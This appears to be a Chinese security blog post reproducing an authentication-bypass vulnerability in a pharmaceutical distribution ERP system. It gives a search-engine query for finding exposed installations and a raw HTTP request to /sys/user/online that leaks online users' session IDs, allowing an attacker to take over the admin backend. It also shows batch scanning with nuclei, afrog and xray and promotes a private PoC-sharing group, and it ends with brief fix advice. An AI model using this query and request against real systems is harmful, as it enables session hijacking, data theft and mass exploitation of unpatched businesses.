#  【漏洞复现】某时空社会化商业ERP系统 user/online 身份认证绕过漏洞   
Superhero  Nday Poc   2024-08-16 10:10  
  
**0x00 免责声明**  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
**0x01 产品简介**  
  
  
某空云社会化商业ERP（简称某空云ERP） ，该产品采用JAVA语言和Oracle数据库， 融合用友软件的先进管理理念，汇集各医药企业特色管理需求，通过规范各个流通环节从而提高企业竞争力、降低人员成本，最终实现全面服务于医药批发、零售连锁企业的信息化建设的目标，是一款全面贴合最新GSP要求的医药流通行业一站式管理系统。  
  
**0x02 漏洞概述**  
  
某时空社会化商业ERP系统 user/online 接口存在身份认证绕过漏洞，未授权的攻击者可利用漏洞url获取在线用户sessionid 导致用户信息泄露，并且切换网站session后可直接接管后台，造成信息泄露或恶意破坏，使系统处于极不安全状态。  
  
  
**0x03 搜索引擎**  
```
title="云时空社会化商业ERP系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKmVmsOvPG3q73gZ3NTLRUk5JFPeyQw5opdIOl9EOTQEYoCW6pqiaOibyVkdsXkiaXa6lcIL5wwjRcfw/640?wx_fmt=png&from=appmsg "")  
  
  
**0x04 漏洞复现**  
```
GET /sys/user/online HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKmVmsOvPG3q73gZ3NTLRUkud6ialqHiawsQJYOckdwjJEMUHRVajdaj5lnwgq5XuPr8r9EQ3hph6mg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKmVmsOvPG3q73gZ3NTLRUkkicrvPFlbMUWwiasEibHXFFO16uECm2E8PprNZYjpyRbFtstxTPNU17DA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKmVmsOvPG3q73gZ3NTLRUkbmUdpO1arEIY2t1c7psRN9F2RBKXehAWrDRASoHPRNbuU2n8Z0bTuw/640?wx_fmt=png&from=appmsg "")  
  
**0x05 工具批量**  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKmVmsOvPG3q73gZ3NTLRUklEAMuPxectpr3W061SCN4kXJibqOOrW6bU0ssBjicphEoS8eZ2rcu5xw/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKmVmsOvPG3q73gZ3NTLRUkN69QmSzOIonEbGnLUjGm4kv90hFpGAxAurkoCFWgjPn5ibsDZE98cjQ/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKmVmsOvPG3q73gZ3NTLRUku1QzqlQianhVxpcaFKQwgfia9b2iaBDbT60XOkgp51yl5AiawuY69dicibAA/640?wx_fmt=png&from=appmsg "")  
  
POC脚本获取  
  
请使用VX扫一扫加入内部  
POC脚本分享圈子  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
**0x06 修复建议**  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、厂商已发布了漏洞修复程序，请及时关注更新：  
  
http://www.ysk360.com/  
  
  
